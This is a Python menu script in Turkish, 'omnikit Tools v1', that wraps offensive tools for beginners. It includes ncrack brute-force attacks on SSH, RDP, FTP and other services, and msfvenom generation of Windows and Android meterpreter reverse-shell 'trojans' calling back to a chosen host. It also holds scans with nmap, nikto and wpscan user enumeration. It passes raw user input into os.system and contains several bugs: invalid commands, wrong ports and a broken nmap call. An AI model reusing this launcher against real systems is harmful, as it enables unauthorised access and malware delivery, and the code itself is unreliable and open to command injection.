#!/usr/bin/env python
import os
import py_compile

os.system("apt-install figlet")
os.system("apt-install chkrootkit")
os.system("clear")
os.system("figlet omnikit Tools v1")
print('''

1-) Exploit Tarama Aracı

2-) Güvenlik Duvarı Tespiti Aracı

3-) Kaba Kuvvet Saldırısı Aracı

4-) Port Tarama Aracı

5-) Rootkit Tarama Aracı

6-) Trojan Oluşturucu Aracı

7-) Zaafiyet Analiz Aracı

8-) Zaafiyet Analiz Aracı v2

9-) Wordlist Oluşturucu Aracı

10-) Hedef Ip Vpn Kontrol Aracı

11-) Mac Adresi Değiştirme Aracı

12-) Wordpress Tarama Aracı

13-) Derleme Aracı

14-) Açıklama

''')
omnikitsecim = input("Seçiminizi yazınız > ")

if(omnikitsecim=="1"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	anahtarkelime = input("Anahtar Kelime Girin: ")
	os.system("searchsloit " + anahtarkelime)

	istek = input("Yeni arama yapmak ister misiniz? (y/n): ")

	if(istek =="y"):
		os.system("python3 omnikit-toolsv1.py")
	elif(istek =="n"):
		print("Görüşürüüüz :') ")

	else:
		print("Hatalı seçim,doğru yaz kanka ")


if(omnikitsecim=="2"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Güvenlik Duvarı Tespit Etme Aracına Hoş Geldin Kanka :D

	''')


	guvenliksite = input("Site Adresini Girin: ")
	os.system("wafw00f " + guvenliksite)


if(omnikitsecim=="3"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''
Kaba Kuvvet Aracına Hoş Geldin :)

1-) FTP
2-) SSH
3-) TELNET
4-) HTTP
5-) SMB
6-) RDP
7-) SIP
8-) REDİS
9-) VNC
10-) PostgreSQL
11-) SQL

''')


	islemno = input("İşlem Numarasını Giriniz: ")
	hedefip = input("Hedef Ip Giriniz: ")
	kadi = input("Kullanıcı Adı Dosya Yolu: ")
	sifre = input("Şifrelerin Bulunduğu Dosya Yolu: ")

	if(islemno=="1"):
		os.system("nrack -p 21 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="2"):
		os.system("ncrack -p 22 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="3"):
		os.system("ncrack -p 23 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="4"):
		os.system("ncrack -p 24 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="5"):
		os.system("ncrack -p 25 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="6"):
		os.system("ncrack -p 26 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="7"):
		os.system("ncrack -p 27 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="8"):
		os.system("ncrack -p 28 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="9"):
		os.system("ncrack -p 29 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="10"):
		os.system("ncrack -p 30 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="11"):
		os.system("ncrack -p 31 -u " + kadi + " -P " + sifre + " " + hedefip)
	else:
		print("Hatalı seçim yaptın >:(")



if(omnikitsecim=="4"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''



Port Tarama Aracına Hoşgeldin

1-) Hızlı Tarama

2-) Servis ve Versiyon Bilgisi

3-) İşletim Sistemi Bilgisi


''')



	islemno = input("İşlem Numarasını Girin: ")
	if(islemno=="1"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system=("nmap " +hedefip)

	elif(islemno=="2"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -sS -sV " +hedefip)

	elif(islemno=="3"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -0 " +hedefip)


	else:
		print("Hatalı seçim yaptın kanka")



if(omnikitsecim=="5"):
	os.system("apt-get install chkrootkit")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Rootkit Tarama Aracına Hoşgeldiniz!


''')
	os.system("chkrootkit")


if(omnikitsecim=="6"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Trojan OLuşturma Aracına Hoş Geldin Kanka :D

	''')

	ip = input("Local veya Dış Ip giriniz: ")
	port = input("Port Girin: ")
	print('''
1-) windows/meterpreter/reverse_tcp
2-) windows/meterpreter/reverse_http
3-) windows/meterpreter/reverse_https
	''')
	payload = input("Payload No Giriniz: ")
	kayityeri = input("Kayıt Yerini Giriniz: ")

	if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="4"):
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="5"):
		os.system("msfvenom -p android/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="6"):
		os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	else:
		print("Hatalı Seçim Yaptın Kanka ")
	
if(omnikitsecim=="7"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")

	print('''

Zaafiyet Analizi Aracına Hoşgeldiniz


	''')

	hedefzaafiyetip = input("Hedef ip giriniz: ")
	os.system("nikto -h " +hedefzaafiyetip)

if(omnikitsecim=="8"):
	os.system("apt-get install figlet")
	os.system("apt-get install lynis")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Hoşgeldiniz Zaafiyet analizi v2 aracı başlatılıyor...
	''')

	os.system("lynis audit system")

	print('''

ANALİZ SONUCU

	''')





if(omnikitsecim=="9"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

En Kısa Yoldan Wordlist Oluşturma Toolu


''')
	minc = input("Minimum kaç haneli olsun? ")
	maxc = input("Maximum kaç haneli olsun? ")
	icindekikelime = input("İçinde hangi kelimeler/rakamlar bulunsun? ")
	dosyaadic = input("Dosyanın adı ne olsun? (uzantısı ile beraber yazınız) ")
	os.system("crunch "+minc+" "+maxc+" "+icindekikelime+" -o "+dosyaadic)

if(omnikitsecim=="10"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Vpn Kontrol Aracına Hoşgeldiniz!

''')

	vpnhedefip = input("Hedef Ip Giriniz > ")
	os.system("ike-scan "+vpnhedefip)




if(omnikitsecim=="11"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

MAC Adresi Değiştirme Aracına Hoşgeldiniz!

1-) Mac Adresini Random Belirle

2-) Mac Adresini Kendin Belirle

3-) Mac Adresini Orjinale Döndür

	''')

	macislem = input("İşlem Numarasını Yazınız > ")
	if(macislem=="1"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -r eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi random belirlendi!]")


	elif(macislem=="2"):
		macadres = input("Yeni Mac Adresini Giriniz > ")
		os.system("ifconfig eth0 down")
		os.system("macchanger --mac "+macadres+" eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi elle belirlendi!]")


	elif(macislem=="3"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -p eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mMac Adresi Orjinale Döndürüldü!]")
	else:
		print("Hatalı Seçim Yaptınız")
	


if(omnikitsecim=="12"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

WORDPRESS Tarama Tool

1-) Hızlı Tarama

2-) Eklenti Tarama

3-) Tema Tarama 

4-) Yönetici Kullanıcı Adı Tarama

	''')

	wpislem = input("İşlem Numarası Giriniz > ")

	if(wpislem=="1"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp)
	elif(wpislem=="2"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate p")
	elif(wpislem=="3"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate t")
	elif(wpislem=="4"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate u")

	else:
		print("Hatalı Seçim Yaptınız")



if(omnikitsecim=="13"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet omnikit")
	print('''

Derleme Aracına Hoşgeldiniz!

	''')

	derle = input("Program Yolunu Giriniz > ")

	py_compile.compile(derle)





if(omnikitsecim=="14"):
	print('''
-------------------------------------------------------------
Bu toollar,tool kullanmaya yeni başlayan ve parametreleri kullanmayı yeni öğrenen insanların işini kolaylaştırmak için omnikit tarafından kodlanmıştır (tool çağırıyor)
-------------------------------------------------------------
	''')
	





